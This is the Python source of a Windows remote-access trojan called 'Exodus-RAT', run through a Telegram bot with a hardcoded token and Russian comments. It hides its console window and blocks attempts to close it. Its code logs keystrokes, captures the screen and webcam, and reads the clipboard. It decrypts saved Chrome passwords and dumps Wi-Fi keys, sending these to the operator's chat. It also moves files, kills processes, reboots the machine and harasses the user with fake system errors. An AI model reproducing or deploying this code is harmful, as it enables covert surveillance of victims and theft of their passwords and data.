import asyncio
import logging
import os
import sys
import subprocess
import platform
import webbrowser
import win32gui
import win32con
import win32api
import win32clipboard
import win32crypt
import sqlite3
import winsound
import random
import time
import psutil
import ctypes
import cv2
import numpy as np
from datetime import datetime
from io import BytesIO
import win32com.client
import pyautogui
import mss
import imageio
import shutil
import winreg
from pynput import keyboard as pynput_keyboard
import wmi
import sounddevice as sd
from scipy.io.wavfile import write
import scapy.all as scapy
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor as aiogram_executor
import configparser
import base64
import socket
from PIL import Image, ImageGrab
import importlib.util

# Проверка наличия зависимостей
required_modules = ['aiogram', 'sounddevice', 'scipy', 'pywin32', 'mss', 'imageio', 'psutil', 'scapy', 'pyautogui', 'watchdog', 'cv2', 'numpy', 'pynput', 'wmi', 'PIL']
missing_modules = [m for m in required_modules if not importlib.util.find_spec(m)]
if missing_modules:
    logging.error(f"Отсутствуют модули: {', '.join(missing_modules)}. Установите их с помощью 'pip install {' '.join(missing_modules)}'")
    sys.exit(1)

# Настройка логирования
logging.basicConfig(
    filename='bot.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - [%(category)s] - %(message)s'
)

# Загрузка конфигурации
config = configparser.ConfigParser()
config_file = os.path.join(os.getenv("APPDATA"), "exodus_rat_config.ini")
if os.path.exists(config_file):
    config.read(config_file)
    bot_token = config.get('Settings', 'bot_token', fallback=None)
    allowed_chat_id = config.get('Settings', 'allowed_chat_id', fallback="5932894746")
else:
    bot_token = os.getenv("EXODUS_BOT_TOKEN", "7780203660:AAGjrQKrNDVCWfq_ZaxbvVxjfeYrQi0FwWQ")
    allowed_chat_id = "5932894746"
    config['Settings'] = {'bot_token': bot_token, 'allowed_chat_id': allowed_chat_id}
    with open(config_file, 'w') as f:
        config.write(f)

# Проверка токена
async def validate_token(token):
    try:
        temp_bot = Bot(token=token)
        await temp_bot.get_me()
        return True
    except Exception as e:
        logging.error(f"Ошибка валидации токена: {str(e)}", extra={'category': 'Auth'})
        return False

if not asyncio.run(validate_token(bot_token)):
    logging.error("Недействительный токен. Замените через BotFather.", extra={'category': 'Auth'})
    with open("token_error.txt", "w", encoding="utf-8") as f:
        f.write("Недействительный токен. Получите новый через BotFather.")
    sys.exit(1)

# Инициализация бота
bot = Bot(token=bot_token)
dp = Dispatcher(bot)

# Глобальные переменные
keylog_active = False
keylog_realtime_active = False
keylog_buffer = []
keylog_file = os.path.join(os.getenv("APPDATA"), "keylog.txt")
input_blocked = False
allow_exit = False
keyboard_swap_active = False
last_command_time = 0
sysinfo_cache = None
sysinfo_cache_time = 0
clipboard_monitor_active = False
network_monitor_active = False
usb_monitor_active = False
file_monitor_active = False
keystroke_pattern_active = False
installed_apps_cache = None
installed_apps_cache_time = 0
monitor_tasks = {}
clipboard_content = ""
shell_context = {}
network_packets = []
usb_devices = []
file_changes = []
keystroke_patterns = []
task_pool = asyncio.Semaphore(5)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def window_proc(hwnd, msg, wparam, lparam):
    if msg == win32con.WM_CLOSE or msg == win32con.WM_DESTROY:
        if not allow_exit:
            return 0
    return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)

def setup_window():
    try:
        hwnd = win32gui.GetConsoleWindow()
        if hwnd:
            win32gui.SetWindowLong(hwnd, win32con.GWL_WNDPROC, window_proc)
            win32gui.EnableMenuItem(win32gui.GetSystemMenu(hwnd, False), win32con.SC_CLOSE, win32con.MF_BYCOMMAND | win32con.MF_GRAYED)
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            logging.info("Консольное окно скрыто.", extra={'category': 'System'})
    except Exception as e:
        logging.error(f"Ошибка скрытия консоли: {str(e)}", extra={'category': 'System'})

def check_auth(message):
    return str(message.chat.id) == allowed_chat_id

def rate_limit():
    global last_command_time
    current_time = time.time()
    if current_time - last_command_time < 0.5:
        return False
    last_command_time = current_time
    return True

async def send_large_file(chat_id, file_path):
    async with task_pool:
        if not os.path.exists(file_path):
            await bot.send_message(chat_id, "Файл не существует.")
            return
        if os.path.getsize(file_path) > 50 * 1024 * 1024:
            await bot.send_message(chat_id, "Файл слишком большой для Telegram.")
            return
        try:
            with open(file_path, 'rb') as f:
                await bot.send_document(chat_id, types.InputFile(f, filename=os.path.basename(file_path)))
            os.remove(file_path)
            logging.info(f"Файл {file_path} отправлен и удалён.", extra={'category': 'File'})
        except Exception as e:
            logging.error(f"Ошибка отправки файла {file_path}: {str(e)}", extra={'category': 'File'})
            await bot.send_message(chat_id, f"Ошибка: {str(e)}")

async def send_long_text(chat_id, text):
    async with task_pool:
        max_length = 4000
        for i in range(0, len(text), max_length):
            await bot.send_message(chat_id, text[i:i + max_length])

async def keylog():
    global keylog_active, keylog_buffer
    try:
        while keylog_active:
            event = pynput_keyboard.read_event(suppress=True)
            if event.event_type == pynput_keyboard.KEY_DOWN:
                key = event.name
                if key:
                    keylog_buffer.append(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
                    if len(keylog_buffer) >= 100:
                        with open(keylog_file, 'a', encoding='utf-8') as f:
                            f.writelines(keylog_buffer)
                        keylog_buffer = []
            await asyncio.sleep(0.01)
        if keylog_buffer:
            with open(keylog_file, 'a', encoding='utf-8') as f:
                f.writelines(keylog_buffer)
            keylog_buffer = []
    except Exception as e:
        logging.error(f"Ошибка кейлоггера: {str(e)}", extra={'category': 'Keylogger'})
        await bot.send_message(allowed_chat_id, f"Ошибка кейлоггера: {str(e)}")

async def keylog_realtime_listener():
    global keylog_realtime_active
    try:
        def on_press(key):
            if not keylog_realtime_active:
                return False
            try:
                key_str = str(key).replace("'", "")
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(allowed_chat_id, f"Клавиша: {key_str} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"),
                    asyncio.get_event_loop()
                )
            except Exception as e:
                logging.error(f"Ошибка в реальном кейлоггере: {str(e)}", extra={'category': 'Keylogger'})
        with pynput_keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"Ошибка в keylog_realtime_listener: {str(e)}", extra={'category': 'Keylogger'})
        await bot.send_message(allowed_chat_id, f"Ошибка реального кейлоггера: {str(e)}")

# Системные команды
@dp.message_handler(commands=['screen'])
async def screen(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            screen_path = os.path.join(os.getenv("APPDATA"), "Screenshot.jpg")
            img = ImageGrab.grab()
            img = img.resize((img.width // 2, img.height // 2), Image.Resampling.LANCZOS)
            img.save(screen_path, quality=50)
            await send_large_file(message.chat.id, screen_path)
        except Exception as e:
            logging.error(f"Ошибка в /screen: {str(e)}", extra={'category': 'Screenshot'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['screenshot_region'])
async def screenshot_region(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split()
            if len(params) != 5:
                await bot.send_message(message.chat.id, "Укажите параметры: /screenshot_region x y w h")
                return
            x, y, w, h = map(int, params[1:])
            screen_path = os.path.join(os.getenv("APPDATA"), "Screenshot_region.jpg")
            img = ImageGrab.grab(bbox=(x, y, x + w, y + h))
            img = img.resize((img.width // 2, img.height // 2), Image.Resampling.LANCZOS)
            img.save(screen_path, quality=50)
            await send_large_file(message.chat.id, screen_path)
        except Exception as e:
            logging.error(f"Ошибка в /screenshot_region: {str(e)}", extra={'category': 'Screenshot'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['screenshot_gif'])
async def screenshot_gif(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            gif_path = os.path.join(os.getenv("APPDATA"), "screen.gif")
            with mss.mss() as sct:
                frames = []
                start_time = time.time()
                while time.time() - start_time < 5:
                    frame = sct.shot()
                    img = Image.open(frame)
                    img = img.resize((img.width // 2, img.height // 2), Image.Resampling.LANCZOS)
                    frames.append(np.array(img))
                    await asyncio.sleep(0.1)
                imageio.mimsave(gif_path, frames, fps=10)
            await send_large_file(message.chat.id, gif_path)
        except Exception as e:
            logging.error(f"Ошибка в /screenshot_gif: {str(e)}", extra={'category': 'Screenshot'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['webcam_snap'])
async def webcam_snap(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                await bot.send_message(message.chat.id, "Веб-камера не обнаружена.")
                return
            ret, frame = cap.read()
            if ret:
                image_path = os.path.join(os.getenv("APPDATA"), "webcam.jpg")
                cv2.imwrite(image_path, frame)
                await send_large_file(message.chat.id, image_path)
            cap.release()
        except Exception as e:
            logging.error(f"Ошибка в /webcam_snap: {str(e)}", extra={'category': 'Webcam'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['info'])
async def info(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            username = os.getlogin()
            os_info = platform.platform()
            processor = platform.processor()
            info = f"ПК: {username}\nОС: {os_info}\nПроцессор: {processor}"
            await bot.send_message(message.chat.id, info)
        except Exception as e:
            logging.error(f"Ошибка в /info: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['sysinfo_extended'])
async def sysinfo_extended(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        global sysinfo_cache, sysinfo_cache_time
        try:
            if sysinfo_cache and time.time() - sysinfo_cache_time < 300:
                await send_long_text(message.chat.id, sysinfo_cache)
                return
            username = os.getlogin()
            os_info = platform.platform()
            processor = platform.processor()
            memory = psutil.virtual_memory()
            disks = "\n".join([f"Диск {p.device}: {p.fstype}, Использовано: {p.used//1024**3} ГБ / {p.total//1024**3} ГБ" for p in psutil.disk_partitions()])
            net = psutil.net_if_addrs()
            network = "\n".join([f"Сеть {k}: {v[0].address}" for k, v in net.items() if v[0].family == 2])
            battery = psutil.sensors_battery()
            battery_info = f"Батарея: {battery.percent}% (Зарядка: {'Да' if battery.power_plugged else 'Нет'})" if battery else "Батарея не обнаружена"
            info = (f"ПК: {username}\n"
                    f"ОС: {os_info}\n"
                    f"Процессор: {processor}\n"
                    f"Память: {memory.percent}% (Использовано: {memory.used//1024**2} МБ / {memory.total//1024**2} МБ)\n"
                    f"Диски:\n{disks}\n"
                    f"Сеть:\n{network}\n"
                    f"{battery_info}")
            sysinfo_cache = info
            sysinfo_cache_time = time.time()
            await send_long_text(message.chat.id, info)
        except Exception as e:
            logging.error(f"Ошибка в /sysinfo_extended: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['sysinfo_hardware'])
async def sysinfo_hardware(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            c = wmi.WMI()
            cpu = c.Win32_Processor()[0].Name
            gpu = c.Win32_VideoController()[0].Name
            bios = c.Win32_BIOS()[0].SMBIOSBIOSVersion
            disks = "\n".join([f"Диск {d.DeviceID}: {d.Model}, Размер: {d.Size//1024**3} ГБ" for d in c.Win32_DiskDrive()])
            motherboard = c.Win32_BaseBoard()[0].Product
            info = (f"Оборудование:\n"
                    f"Процессор: {cpu}\n"
                    f"Видеокарта: {gpu}\n"
                    f"Материнская плата: {motherboard}\n"
                    f"BIOS: {bios}\n"
                    f"Диски:\n{disks}")
            await send_long_text(message.chat.id, info)
        except Exception as e:
            logging.error(f"Ошибка в /sysinfo_hardware: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['uptime'])
async def uptime(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            boot_time = psutil.boot_time()
            current_time = time.time()
            uptime_seconds = current_time - boot_time
            hours, remainder = divmod(uptime_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            await bot.send_message(message.chat.id, f"Время работы: {int(hours)}ч, {int(minutes)}м, {int(seconds)}с")
        except Exception as e:
            logging.error(f"Ошибка в /uptime: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['processes'])
async def processes(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "⚠ Без прав администратора некоторые процессы могут быть недоступны.")
            process_list = []
            for p in psutil.process_iter(['name', 'pid']):
                try:
                    process_list.append(f"{p.info['name']} (PID: {p.info['pid']})")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            if not process_list:
                await bot.send_message(message.chat.id, "Нет доступных процессов.")
                return
            chunk_size = 30
            for i in range(0, len(process_list), chunk_size):
                chunk = "\n".join(process_list[i:i + chunk_size])
                await send_long_text(message.chat.id, chunk or "Нет активных процессов в этом сегменте.")
        except Exception as e:
            logging.error(f"Ошибка в /processes: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['system_resources'])
async def system_resources(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            cpu_usage = psutil.cpu_percent(interval=0.1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            await bot.send_message(message.chat.id, f"CPU: {cpu_usage}%\n"
                                                  f"Память: {memory.percent}% (Использовано: {memory.used//1024**2} МБ / {memory.total//1024**2} МБ)\n"
                                                  f"Диск: {disk.percent}% (Использовано: {disk.used//1024**3} ГБ / {disk.total//1024**3} ГБ)")
        except Exception as e:
            logging.error(f"Ошибка в /system_resources: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['passwords'])
async def passwords(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
            if not os.path.exists(chrome_path):
                await bot.send_message(message.chat.id, "Пароли Chrome не найдены.")
                return
            shutil.copy(chrome_path, "LoginData")
            conn = sqlite3.connect("LoginData")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 50")
            passwords = []
            for row in cursor.fetchall():
                url, username, encrypted = row
                try:
                    password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                    passwords.append(f"URL: {url}\nЛогин: {username}\nПароль: {password}\n{'-'*20}")
                except:
                    continue
            conn.close()
            os.remove("LoginData")
            output = "\n".join(passwords) or "Пароли не найдены."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /passwords: {str(e)}", extra={'category': 'Browser'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['get_clipboard'])
async def get_clipboard(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            win32clipboard.OpenClipboard()
            content = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            await bot.send_message(message.chat.id, f"Буфер обмена: {content[:4000]}")
        except Exception as e:
            logging.error(f"Ошибка в /get_clipboard: {str(e)}", extra={'category': 'Clipboard'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['window_list'])
async def window_list(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            def enum_windows(hwnd, results):
                if win32gui.IsWindowVisible(hwnd):
                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        results.append(title)
            windows = []
            win32gui.EnumWindows(enum_windows, windows)
            output = "\n".join(windows[:50]) or "Окна не найдены."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /window_list: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['power_status'])
async def power_status(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            battery = psutil.sensors_battery()
            if battery:
                status = f"Батарея: {battery.percent}% (Зарядка: {'Да' if battery.power_plugged else 'Нет'})"
            else:
                status = "Батарея не обнаружена."
            await bot.send_message(message.chat.id, status)
        except Exception as e:
            logging.error(f"Ошибка в /power_status: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Файловые операции
@dp.message_handler(commands=['ls'])
async def ls(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            files = os.listdir(os.getcwd())
            output = "\n".join(files[:50]) or "Директория пуста."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /ls: {str(e)}", extra={'category': 'File'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['pwd'])
async def pwd(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            await bot.send_message(message.chat.id, f"Текущая директория: {os.getcwd()}")
        except Exception as e:
            logging.error(f"Ошибка в /pwd: {str(e)}", extra={'category': 'File'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['cd'])
async def cd(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /cd folder")
                return
            path = params[1]
            os.chdir(path)
            await bot.send_message(message.chat.id, f"Директория изменена: {os.getcwd()}")
        except Exception as e:
            logging.error(f"Ошибка в /cd: {str(e)}", extra={'category': 'File'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['download'])
async def download(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /download file_path")
                return
            file_path = params[1]
            await send_large_file(message.chat.id, file_path)
        except Exception as e:
            logging.error(f"Ошибка в /download: {str(e)}", extra={'category': 'File'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['upload'])
async def upload(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            await bot.send_message(message.chat.id, "Отправьте файл для загрузки.")
            dp.register_message_handler(upload_file, content_types=['document'])
        except Exception as e:
            logging.error(f"Ошибка в /upload: {str(e)}", extra={'category': 'File'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

async def upload_file(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            file = await message.document.get_file()
            file_path = os.path.join(os.getenv("APPDATA"), message.document.file_name)
            await file.download(file_path)
            await bot.send_message(message.chat.id, f"Файл загружен: {file_path}")
            dp.message_handlers.unregister(upload_file)
        except Exception as e:
            logging.error(f"Ошибка в upload_file: {str(e)}", extra={'category': 'File'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Троллинг
@dp.message_handler(commands=['play_sound'])
async def play_sound(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            winsound.Beep(1000, 500)
            await bot.send_message(message.chat.id, "Звук проигран.")
        except Exception as e:
            logging.error(f"Ошибка в /play_sound: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['fake_error'])
async def fake_error(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            ctypes.windll.user32.MessageBoxW(0, "Критическая ошибка системы!", "Windows", 16)
            await bot.send_message(message.chat.id, "Фейковая ошибка показана.")
        except Exception as e:
            logging.error(f"Ошибка в /fake_error: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['troll_popup'])
async def troll_popup(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            async def popup():
                for _ in range(5):
                    ctypes.windll.user32.MessageBoxW(0, "Ты взломан!", "Exodus-RAT", 48)
                    await asyncio.sleep(1)
            asyncio.create_task(popup())
            await bot.send_message(message.chat.id, "Всплывающие окна запущены.")
        except Exception as e:
            logging.error(f"Ошибка в /troll_popup: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['rickroll'])
async def rickroll(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            await bot.send_message(message.chat.id, "Рикролл запущен!")
        except Exception as e:
            logging.error(f"Ошибка в /rickroll: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['set_wallpaper'])
async def set_wallpaper(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /set_wallpaper path")
                return
            path = params[1]
            if not os.path.exists(path):
                await bot.send_message(message.chat.id, "Файл не существует.")
                return
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            await bot.send_message(message.chat.id, "Обои установлены.")
        except Exception as e:
            logging.error(f"Ошибка в /set_wallpaper: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['open_url'])
async def open_url(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /open_url url")
                return
            url = params[1]
            webbrowser.open(url)
            await bot.send_message(message.chat.id, f"URL открыт: {url}")
        except Exception as e:
            logging.error(f"Ошибка в /open_url: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['mouse_chaos'])
async def mouse_chaos(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            async def chaos():
                screen_width, screen_height = pyautogui.size()
                for _ in range(20):
                    x = random.randint(0, screen_width)
                    y = random.randint(0, screen_height)
                    pyautogui.moveTo(x, y, duration=0.1)
                    await asyncio.sleep(0.5)
            asyncio.create_task(chaos())
            await bot.send_message(message.chat.id, "Хаос мыши запущен.")
        except Exception as e:
            logging.error(f"Ошибка в /mouse_chaos: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['random_beeps'])
async def random_beeps(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            async def beeps():
                for _ in range(10):
                    winsound.Beep(random.randint(500, 2000), random.randint(100, 500))
                    await asyncio.sleep(0.5)
            asyncio.create_task(beeps())
            await bot.send_message(message.chat.id, "Случайные звуки запущены.")
        except Exception as e:
            logging.error(f"Ошибка в /random_beeps: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['screen_flash'])
async def screen_flash(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            async def flash():
                for _ in range(5):
                    win32api.keybd_event(0x91, 0, 0, 0)
                    await asyncio.sleep(0.5)
                    win32api.keybd_event(0x91, 0, win32con.KEYEVENTF_KEYUP, 0)
                    await asyncio.sleep(0.5)
            asyncio.create_task(flash())
            await bot.send_message(message.chat.id, "Мигание экрана запущено.")
        except Exception as e:
            logging.error(f"Ошибка в /screen_flash: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['fake_update'])
async def fake_update(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            ctypes.windll.user32.MessageBoxW(0, "Обновление Windows... Не выключайте компьютер!", "Windows Update", 64)
            await bot.send_message(message.chat.id, "Фейковое обновление показано.")
        except Exception as e:
            logging.error(f"Ошибка в /fake_update: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['keyboard_swap'])
async def keyboard_swap(message: types.Message):
    global keyboard_swap_active
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if keyboard_swap_active:
                keyboard_swap_active = False
                await bot.send_message(message.chat.id, "Смена клавиш отключена.")
            else:
                keyboard_swap_active = True
                async def swap():
                    while keyboard_swap_active:
                        pyautogui.hotkey('ctrl', 'c')
                        await asyncio.sleep(1)
                asyncio.create_task(swap())
                await bot.send_message(message.chat.id, "Смена клавиш включена.")
        except Exception as e:
            logging.error(f"Ошибка в /keyboard_swap: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['type_text'])
async def type_text(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /type_text text")
                return
            text = params[1]
            pyautogui.write(text, interval=0.1)
            await bot.send_message(message.chat.id, f"Текст '{text}' введён.")
        except Exception as e:
            logging.error(f"Ошибка в /type_text: {str(e)}", extra={'category': 'Troll'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Управление системой
@dp.message_handler(commands=['task_kill'])
async def task_kill(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split()
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /task_kill pid")
                return
            pid = int(params[1])
            process = psutil.Process(pid)
            process.terminate()
            await bot.send_message(message.chat.id, f"Процесс {pid} завершён.")
        except Exception as e:
            logging.error(f"Ошибка в /task_kill: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['send_message'])
async def send_message(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /send_message text")
                return
            text = params[1]
            ctypes.windll.user32.MessageBoxW(0, text, "Сообщение", 64)
            await bot.send_message(message.chat.id, "Сообщение показано.")
        except Exception as e:
            logging.error(f"Ошибка в /send_message: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['volume_up'])
async def volume_up(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            for _ in range(5):
                pyautogui.press('volumeup')
            await bot.send_message(message.chat.id, "Громкость увеличена.")
        except Exception as e:
            logging.error(f"Ошибка в /volume_up: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['volume_down'])
async def volume_down(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            for _ in range(5):
                pyautogui.press('volumedown')
            await bot.send_message(message.chat.id, "Громкость уменьшена.")
        except Exception as e:
            logging.error(f"Ошибка в /volume_down: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['lock_screen'])
async def lock_screen(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            ctypes.windll.user32.LockWorkStation()
            await bot.send_message(message.chat.id, "Экран заблокирован.")
        except Exception as e:
            logging.error(f"Ошибка в /lock_screen: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['reboot'])
async def reboot(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            subprocess.run("shutdown /r /t 0", shell=True)
            await bot.send_message(message.chat.id, "Система перезагружается.")
        except Exception as e:
            logging.error(f"Ошибка в /reboot: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['get_wifi'])
async def get_wifi(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            result = subprocess.run("netsh wlan show profiles", capture_output=True, text=True, shell=True)
            profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
            wifi_info = []
            for profile in profiles[:10]:
                result = subprocess.run(f"netsh wlan show profile name=\"{profile}\" key=clear", capture_output=True, text=True, shell=True)
                for line in result.stdout.splitlines():
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        wifi_info.append(f"Сеть: {profile}\nПароль: {key}\n{'-'*20}")
            output = "\n".join(wifi_info) or "Wi-Fi профили не найдены."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /get_wifi: {str(e)}", extra={'category': 'Network'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

